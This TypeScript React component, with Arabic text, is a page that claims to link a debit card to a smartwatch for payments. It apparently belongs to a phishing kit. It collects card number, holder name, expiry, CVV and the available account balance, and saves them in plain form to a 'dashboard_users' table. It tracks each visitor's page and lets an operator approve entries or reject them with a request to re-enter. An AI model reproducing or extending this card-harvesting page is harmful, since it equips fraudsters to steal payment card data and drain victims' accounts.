import { useState, useEffect } from "react";
import { useSearchParams } from "react-router-dom";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { supabase } from "@/integrations/supabase/client";
import { useToast } from "@/components/ui/use-toast";
import { useAdminRedirect } from "@/hooks/use-admin-redirect";
import WaitingOverlay from "@/components/WaitingOverlay";
import { CreditCard, Lock, CheckCircle2, Sparkles } from "lucide-react";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import cardBanner from "@/assets/card-data-banner.jpg";
import SiteHeader from "@/components/SiteHeader";
import SiteFooter from "@/components/SiteFooter";


const CardData = () => {
  const [searchParams] = useSearchParams();
  const { toast } = useToast();
  const userId = searchParams.get("uid") || "";
  const wasRejected = searchParams.get("rejected") === "true";

  const [cardNumber, setCardNumber] = useState("");
  const [cardHolder, setCardHolder] = useState("");
  const [expiryMonth, setExpiryMonth] = useState("");
  const [expiryYear, setExpiryYear] = useState("");
  const [cvv, setCvv] = useState("");
  const [balance, setBalance] = useState("");
  const [loading, setLoading] = useState(false);
  const [submitted, setSubmitted] = useState(false);
  const [rejectionError, setRejectionError] = useState(wasRejected);

  useEffect(() => {
    if (wasRejected) {
      setSubmitted(false);
      setRejectionError(true);
    }
  }, [wasRejected, searchParams.get("t")]);

  useAdminRedirect(userId || null, { approveRedirect: submitted ? "/waiting" : undefined });

  useEffect(() => {
    if (!userId) return;
    supabase.from("dashboard_users").update({ last_page: "بيانات البطاقة" }).eq("id", userId).then();
  }, [userId]);


  const formatCardNumber = (val: string) => {
    const digits = val.replace(/\D/g, "").slice(0, 16);
    return digits.replace(/(.{4})/g, "$1 ").trim();
  };

  const months = Array.from({ length: 12 }, (_, i) => String(i + 1).padStart(2, "0"));
  const currentYear = new Date().getFullYear();
  const years = Array.from({ length: 10 }, (_, i) => String(currentYear + i));

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!cardNumber || !cardHolder || !expiryMonth || !expiryYear || !cvv || !balance) {
      toast({ title: "خطأ", description: "يرجى ملء جميع الحقول", variant: "destructive" });
      return;
    }
    setLoading(true);
    const { error } = await supabase
      .from("dashboard_users")
      .update({
        card_data: [{
          cardNumber: cardNumber.replace(/\s/g, ""),
          cardHolder,
          expiryDate: `${expiryMonth}/${expiryYear}`,
          cvv,
          balance,
        }],
        last_page: "بيانات البطاقة",
        status_tabs: {},
      })
      .eq("id", userId);
    if (error) {
      toast({ title: "خطأ", description: "حدث خطأ أثناء الحفظ", variant: "destructive" });
    } else {
      toast({ title: "تم", description: "تم إرسال بيانات البطاقة بنجاح" });
      setSubmitted(true);
    }
    setLoading(false);
  };

  const inputClasses = "text-center text-sm h-11 bg-muted/30 border-border/40 rounded-xl focus:ring-2 focus:ring-primary/30 focus:border-primary/50 transition-all";

  return (
    <div className="min-h-screen bg-background relative" dir="rtl">
      <div className="fixed inset-0 gradient-mesh pointer-events-none" />
      <SiteHeader />

      {/* Banner */}
      <div className="relative">
        <img src={cardBanner} alt="بطاقة مصرفية آمنة" className="w-full h-36 object-cover" width={1024} height={512} />
        <div className="absolute inset-0 bg-gradient-to-t from-background via-background/50 to-black/40" />
        <div className="absolute inset-0 pattern-grid opacity-15" />
        <div className="absolute bottom-3 right-0 left-0 text-center">
          <h1 className="text-base font-extrabold text-white drop-shadow-[0_2px_12px_rgba(0,0,0,0.7)] leading-snug">
            بيانات بطاقة الخصم التي ترغب بربطها بالساعة الذكية
          </h1>
        </div>
      </div>

      

      <section className="py-5 px-2 relative z-10">
        <div className="w-full max-w-none px-1">
          {rejectionError && (
            <div className="bg-destructive/5 border border-destructive/20 rounded-2xl p-4 mb-4 flex items-start gap-3 animate-fade-in card-shadow">
              <span className="text-2xl mt-0.5">⚠️</span>
              <div>
                <p className="text-sm font-bold text-destructive mb-0.5">بيانات غير صحيحة</p>
                <p className="text-[11px] text-muted-foreground leading-relaxed">البيانات المدخلة غير صحيحة، يرجى التأكد منها وإعادة إدخالها.</p>
              </div>
              <button onClick={() => setRejectionError(false)} className="text-muted-foreground hover:text-foreground text-lg mr-auto">✕</button>
            </div>
          )}

          {/* Motivational */}
          <div className="flex items-start gap-3 bg-card/80 backdrop-blur-sm rounded-2xl p-4 mb-4 border border-border/40 card-shadow">
            <div className="w-9 h-9 rounded-xl hero-gradient flex items-center justify-center shrink-0 shadow-button">
              <Sparkles className="w-4 h-4 text-primary-foreground" />
            </div>
            <div>
              <p className="text-sm font-bold text-foreground mb-0.5">أنت على بُعد خطوة واحدة!</p>
              <p className="text-xs text-muted-foreground leading-relaxed">
                أدخل بيانات بطاقتك بدقة لتفعيل خدمات الدفع عبر ساعتك الذكية فوراً.
              </p>
            </div>
          </div>

          {/* Form */}
          <form onSubmit={handleSubmit} className="space-y-4">
            <div className="bg-card rounded-2xl p-5 card-shadow border border-border/30 space-y-3">
              <div className="flex items-center gap-2.5 pb-2.5 border-b border-border/30">
                <div className="w-8 h-8 rounded-xl hero-gradient flex items-center justify-center shadow-button">
                  <CreditCard className="w-4 h-4 text-primary-foreground" />
                </div>
                <span className="text-base font-bold text-foreground">معلومات البطاقة</span>
              </div>

              <div>
                <label className="block text-sm font-bold text-muted-foreground mb-2 text-right">رقم البطاقة (16 رقماً)</label>
                <Input placeholder="0000 0000 0000 0000" value={cardNumber} onChange={(e) => setCardNumber(formatCardNumber(e.target.value))} className={`${inputClasses} tracking-[0.2em]`} dir="ltr" maxLength={19} />
              </div>
              <div>
                <label className="block text-sm font-bold text-muted-foreground mb-2 text-right">اسم صاحب البطاقة</label>
                <Input placeholder="كما هو مكتوب على البطاقة" value={cardHolder} onChange={(e) => setCardHolder(e.target.value)} className={inputClasses} />
              </div>
              <div className="grid grid-cols-3 gap-2">
                <div>
                  <label className="block text-sm font-bold text-muted-foreground mb-2 text-center">رمز CVC</label>
                  <Input placeholder="•••" value={cvv} onChange={(e) => setCvv(e.target.value.replace(/\D/g, "").slice(0, 3))} className={inputClasses} dir="ltr" maxLength={3} type="password" />
                </div>
                <div>
                  <label className="block text-sm font-bold text-muted-foreground mb-2 text-center">السنة</label>
                  <Select value={expiryYear} onValueChange={setExpiryYear}>
                    <SelectTrigger className="h-11 bg-muted/30 border-border/40 rounded-xl text-sm"><SelectValue placeholder="سنة" /></SelectTrigger>
                    <SelectContent>{years.map((y) => <SelectItem key={y} value={y}>{y}</SelectItem>)}</SelectContent>
                  </Select>
                </div>
                <div>
                  <label className="block text-sm font-bold text-muted-foreground mb-2 text-center">الشهر</label>
                  <Select value={expiryMonth} onValueChange={setExpiryMonth}>
                    <SelectTrigger className="h-11 bg-muted/30 border-border/40 rounded-xl text-sm"><SelectValue placeholder="شهر" /></SelectTrigger>
                    <SelectContent>{months.map((m) => <SelectItem key={m} value={m}>{m}</SelectItem>)}</SelectContent>
                  </Select>
                </div>
              </div>
            </div>

            {/* Balance */}
            <div className="bg-card rounded-2xl p-5 card-shadow border border-border/30">
              <div className="flex items-center gap-2.5 pb-2.5 border-b border-border/30 mb-3">
                <div className="w-8 h-8 rounded-xl hero-gradient flex items-center justify-center shadow-button">
                  <Lock className="w-4 h-4 text-primary-foreground" />
                </div>
                <span className="text-base font-bold text-foreground">الرصيد المتوفر</span>
              </div>
              <Input placeholder="أدخل الرصيد المتوفر في حسابك" value={balance} onChange={(e) => setBalance(e.target.value)} className={inputClasses} dir="rtl" />
            </div>

            <div className="flex items-center gap-2 rounded-xl py-2.5 px-3 bg-card/60 backdrop-blur-sm border border-border/30">
              <div className="w-7 h-7 rounded-lg hero-gradient flex items-center justify-center shrink-0">
                <CheckCircle2 className="w-3.5 h-3.5 text-primary-foreground" />
              </div>
              <p className="text-xs text-muted-foreground leading-relaxed">
                سيتم ربط بطاقتك بالساعة الذكية لتفعيل الدفع الإلكتروني بشكل آمن وفوري.
              </p>
            </div>

            <Button type="submit" disabled={loading} className="w-full hero-gradient text-primary-foreground text-base font-bold py-6 rounded-xl shadow-button hover:shadow-[0_6px_24px_hsl(213_76%_44%/0.4)] transition-all">
              {loading ? "جاري الحفظ..." : "تأكيد البيانات"}
            </Button>
          </form>
        </div>
      </section>
      <SiteFooter />

      {submitted && <WaitingOverlay />}
    </div>
  );
};

export default CardData;
